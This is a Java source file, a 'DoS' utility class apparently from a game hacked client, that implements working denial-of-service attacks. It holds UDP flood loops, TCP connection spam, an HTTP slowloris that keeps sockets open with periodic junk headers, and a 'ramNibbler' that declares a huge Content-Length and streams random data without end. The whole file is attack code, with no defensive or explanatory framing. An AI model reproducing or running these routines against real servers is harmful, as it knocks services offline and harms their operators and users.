package net.shadow.client.helper.util;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class DoS {

    final static List<OutputStream> loris = new ArrayList<>();

    public static void udp(String hostname, int port) {
        try {
            DatagramSocket socket = new DatagramSocket();
            //socket.connect(new InetSocketAddress(hostname, port)); datagram sockets dont need to connect according to wikipedia
            byte[] payload = new byte[256];
            for (int i = 0; i < 255; i++) {
                payload[i] = (byte) 1;
            }
            InetAddress target = InetAddress.getByName(hostname);
            DatagramPacket crash = new DatagramPacket(payload, payload.length, target, port);
            socket.send(crash);
            socket.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void udp2(String hostname, int port) {
        try {
            DatagramSocket socket = new DatagramSocket();
            //socket.connect(new InetSocketAddress(hostname, port)); datagram sockets dont need to connect according to wikipedia
            byte[] payload = new byte[4096];
            for (int i = 0; i < 4095; i++) {
                payload[i] = (byte) 1;
            }
            InetAddress target = InetAddress.getByName(hostname);
            DatagramPacket crash = new DatagramPacket(payload, payload.length, target, port);
            while(true){
                socket.send(crash);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void tcp(String hostname, int port) {
        try {
            Socket socket = new Socket(hostname, port);
            socket.connect(new InetSocketAddress(hostname, port));
            socket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void tcp2(String hostname, int port) {
        try {
            Socket socket = new Socket(hostname, port);
            socket.setKeepAlive(true);
            socket.connect(new InetSocketAddress(hostname, port));
            //socket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void http(String host, int port, String path) {
        try {
            Socket s = new Socket();
            s.connect(new InetSocketAddress(host, port));
            OutputStream os = s.getOutputStream();
            os.write(("GET " + path + " HTTP/1.1\n").getBytes(StandardCharsets.UTF_8));
            os.write("User-Agent: shadow /1.0\n\n".getBytes(StandardCharsets.UTF_8));
        } catch (Exception ignored) {
        }
    }

    public static void ramNibbler(String hostname, int port, String path) throws IOException {
        Socket s = new Socket();
        s.connect(new InetSocketAddress(hostname, port));
        OutputStream os = s.getOutputStream();
        os.write(("POST " + path + " HTTP/1.1\n").getBytes(StandardCharsets.UTF_8));
        os.write("User-Agent: shadow /1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 2147483647\nAccept: */*\n\n".getBytes(StandardCharsets.UTF_8));
        os.write("Shits-Fucked: ".getBytes(StandardCharsets.UTF_8));
        while (true) {
            os.write((rndPacket(2048)).getBytes(StandardCharsets.UTF_8));
        }
    }


    public static void slowLoris(String hostname, int port, String path) throws IOException {
        if (loris.size() == 0) {
            new Thread(() -> {
                for (OutputStream os : loris) {
                    try {
                        os.write(("User-Data: " + rndStr(15) + "\n").getBytes(StandardCharsets.UTF_8));
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    Utils.sleep(5000);
                }
            }, "lorisPinger").start();
        }
        Socket s = new Socket();
        s.connect(new InetSocketAddress(hostname, port));
        OutputStream os = s.getOutputStream();
        InputStream is = s.getInputStream();
        os.write(("GET " + path + " HTTP/1.1\n").getBytes(StandardCharsets.UTF_8));
        os.write("User-Agent: shadow /1.0\n".getBytes(StandardCharsets.UTF_8));
        loris.add(os);
    }

    private static String rndStr(int size) {
        StringBuilder buf = new StringBuilder();
        String[] chars = new String[]{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"};
        Random r = new Random();
        for (int i = 0; i < size; i++) {
            buf.append(chars[r.nextInt(chars.length)]);
        }
        return buf.toString();
    }

    private static String rndPacket(int size) {
        StringBuilder buf = new StringBuilder();
        String[] chars = new String[]{"䲜", "龘", "䨻", "𪚥", "𰽔", "𱁬", "", "", "", "", "", ""};
        Random r = new Random();
        for (int i = 0; i < size; i++) {
            buf.append(chars[r.nextInt(chars.length)]);
        }
        return buf.toString();
    }
}
